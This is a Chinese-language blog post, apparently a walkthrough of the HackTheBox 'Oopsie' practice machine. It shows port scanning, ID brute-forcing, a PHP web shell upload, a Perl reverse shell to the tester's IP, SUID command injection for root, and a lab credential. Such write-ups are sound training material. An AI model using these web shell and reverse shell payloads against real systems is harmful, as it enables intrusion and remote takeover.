@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Mr.Be1ieVe&#39;s Treasure">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg">
+    <meta property="twitter:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg" />
+    
+
+    
+    <meta name="title" content="HackTheBox Starting Point Oopsie .28" />
+    <meta property="og:title" content="HackTheBox Starting Point Oopsie .28" />
+    <meta property="twitter:title" content="HackTheBox Starting Point Oopsie .28" />
+    
+
+    
+    <meta name="description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。">
+    <meta property="og:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    <meta property="twitter:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Mr.Be1ieVe">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>HackTheBox Starting Point Oopsie .28 | Mr.Be1ieVe的博客 | Mr.Be1ieVe&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/hackthebox-starting-point-oopsie-.28/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Mr.Be1ieVe&#39;s Treasure</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">个人原则宪法</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%AE%9E%E8%B7%B5">安全建设实践</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E4%B8%8E%E5%88%86%E6%9E%90">底层原理思考与分析</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-universe.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/hackthebox" title="HackTheBox">
+                            HackTheBox
+                        </a>
+                        
+                    </div>
+                    <h1>HackTheBox Starting Point Oopsie .28</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Mr.Be1ieVe&#39;s Treasure
+                             
+                            on 
+                            Friday, December 4, 2020
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <p>扫描结果</p>
+<pre tabindex="0"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 06:15 EST
+Nmap scan report for 10.10.10.28
+Host is up (0.49s latency).
+
+PORT     STATE  SERVICE          VERSION
+21/tcp   closed ftp
+23/tcp   closed telnet
+53/tcp   closed domain
+80/tcp   open   http             Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                                                            
+|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                               
+|_http-title: Welcome                                                                                                                                                                                                                      
+110/tcp  closed pop3                                                                                                                                                                                                                       
+111/tcp  closed rpcbind                                                                                                                                                                                                                    
+113/tcp  closed ident                                                                                                                                                                                                                      
+135/tcp  closed msrpc
+139/tcp  closed netbios-ssn
+143/tcp  closed imap
+256/tcp  closed fw1-secureremote
+445/tcp  closed microsoft-ds
+587/tcp  closed submission
+993/tcp  closed imaps
+995/tcp  closed pop3s
+1723/tcp closed pptp
+3306/tcp closed mysql
+3389/tcp closed ms-wbt-server
+5900/tcp closed vnc
+8080/tcp closed http-proxy
+8888/tcp closed sun-answerbook
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.00 seconds
+</code></pre><p>打开对应80端口 http://10.10.10.28/#</p>
+<p>看了看没有啥，扫描路径走起</p>
+<p>扫出来一个登录 http://10.10.10.28/cdn-cgi/login/i</p>
+<p>密码用的是前面window机器获取的！！！wdnmd</p>
+<p>进去之后，Account页面</p>
+<p><code>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code></p>
+<p>这个id = 1，爆破一下之后，爆出来30的时候查询到了super admin的id和账户</p>
+<p>而在upload界面，就需要super admin的cookie才能访问到上传</p>
+<p>使用dirsearch工具可以找到<code>/uploads/</code>。 上传的php就保存到了这里</p>
+<p>这里我使用php一句话反弹shell连上就断，使用perl就可以正常连接。</p>
+<p>test.php
+<code>&lt;?php echo shell_exec($_GET['shell']);?&gt;</code></p>
+<p>访问link
+<code>http://10.10.10.28/uploads/test.php?shell=perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%2210.10.14.214:4444%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27</code></p>
+<p>对应perl命令<code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></p>
+<p>可看<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl">swisskyrepo/PayloadsAllTheThings</a></p>
+<p>连进去之后需要提权</p>
+<blockquote>
+<pre tabindex="0"><code>SHELL=/bin/bash script -q /dev/null   //见注解1
+Ctrl-Z          //见注解2
+stty raw -echo        //见注解3
+fg           //见注解4
+reset          //见注解5
+xterm          //见注解6
+</code></pre><ol>
+<li>将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</li>
+<li>将netcat暂挂至后台</li>
+<li>将本地终端置于原始模式，以免干扰远程终端</li>
+<li>将netcat返回到前台，注意：这里不会显示输入的命令</li>
+<li>重置远程终端，经测试也可以不进行此操作</li>
+<li>运行xterm
+来源 <a href="https://blog.csdn.net/m0_48066270/article/details/108641892">渗透测试练习靶场hackthebox——Starting Point Oopsie攻略_TF0xn的博客-CSDN博客</a></li>
+</ol>
+</blockquote>
+<p>在目录之间找了找之后，在<code>cdn-cgi/login</code>找到个<code>db.php</code>，里边有个账户密码，su 切换过去就有了用户权限。</p>
+<p><code>ls -lh $(find / -perm -u=s -type f 2&gt;/dev/null)</code>查看有SUID权限 的可执行文件</p>
+<p>使用<code>cat /etc/group</code>查看bugtracker用户组</p>
+<p>发现可以运行就直接<code>/usr/bin/bugtracker</code>执行了，发现看起来是个cat的代码执行，尝试<code>;</code>命令注入成功，获取了root权限</p>
+<p><code>ls -lRa /root</code>查找root路径下有什么</p>
+<blockquote>
+<p>-R, &ndash;recursive            list subdirectories recursively</p>
+</blockquote>
+<blockquote>
+<p>Inside root&rsquo;s folder, we see a .config folder, which contains a FileZilla config file with the credentials ftpuser / mc@F1l3ZilL4 visible in plain text.</p>
+</blockquote>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://mrbelieve.tech"><img src="/img/favicon.png" />Mr.Be1ieVe&#39;s Treasure</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/iotgoat/" data-toggle="tooltip" data-placement="top" title="IoTGoat">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/iot%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86/" data-toggle="tooltip" data-placement="top" title="iot信息整理">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/awd" title="awd">
+                            awd
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/buu" title="buu">
+                            buu
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hackthebox" title="hackthebox">
+                            hackthebox
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/linux%E4%BD%BF%E7%94%A8" title="linux使用">
+                            linux使用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0" title="专业学习">
+                            专业学习
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">
+                            基础知识
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
+                            学习笔记
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:mr_believe@outlook.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/MrBe1ieVe">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Mr.Be1ieVe&#39;s Treasure" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Mr.Be1ieVe&#39;s Treasure 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
